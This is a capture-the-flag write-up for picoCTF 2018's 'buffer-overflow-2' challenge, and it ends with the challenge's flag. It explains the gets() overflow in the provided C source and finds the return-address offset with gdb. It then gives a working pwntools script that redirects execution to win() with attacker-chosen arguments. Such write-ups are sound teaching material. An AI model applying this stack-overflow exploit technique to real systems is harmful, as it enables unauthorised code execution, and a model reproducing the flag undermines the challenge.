# Problem
Alright, this time you'll need to control some arguments. Can you get the flag from this [program](https://2018shell1.picoctf.com/static/8ec59d858594f0e03108cf12e6177682/vuln)? You can find it in /problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa on the shell server. [Source](https://2018shell1.picoctf.com/static/8ec59d858594f0e03108cf12e6177682/vuln.c).

## Hints:
Try using gdb to print out the stack once you write to it!

## Solution:

Lets download the files:
```bash
wget https://2018shell1.picoctf.com/static/8ec59d858594f0e03108cf12e6177682/vuln
wget https://2018shell1.picoctf.com/static/8ec59d858594f0e03108cf12e6177682/vuln.c
```

First, we investigate the source
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xDEADC0DE)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}
```

What we need to do here is to call ```win(0xDEADBEEF, 0xDEADC0DE)``` from ```vuln()``` somehow.

The call to ```gets()``` in ```vuln()``` is unsafe, there is no limit checking, so we can use a buffer overflow in order to do so.

We can override the return address and jump to win.

First we need to check the offset overriding the return address. We can use this gdbinit script
```
run < <(echo AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ0000111122223333444455556666)
```

Lets debug:
```bash
gdb -x ./gdbinit ./vuln

Stopped reason: SIGSEGV
0x32323232 in ?? ()
```

We know that ```2222``` overrides the return address.

Now lets write a simple python script:
```python
#!/usr/bin/env python

from pwn import *


debug = 0

user = ''
pw = ''

if debug:
  p = process('./vuln')
else:
  s = ssh(host = '2018shell1.picoctf.com', user=user, password=pw)
  s.set_working_directory('/problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa')
  p = s.process('./vuln')

binary = ELF('./vuln')

print p.recvuntil('string:')
p.sendline('AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ00001111' + p32(binary.symbols['win']) + 'XXXX' + p32(0xDEADBEEF) + p32(0xDEADC0DE))
print p.recvall()
```

Flag: picoCTF{addr3ss3s_ar3_3asy1b78b0d8}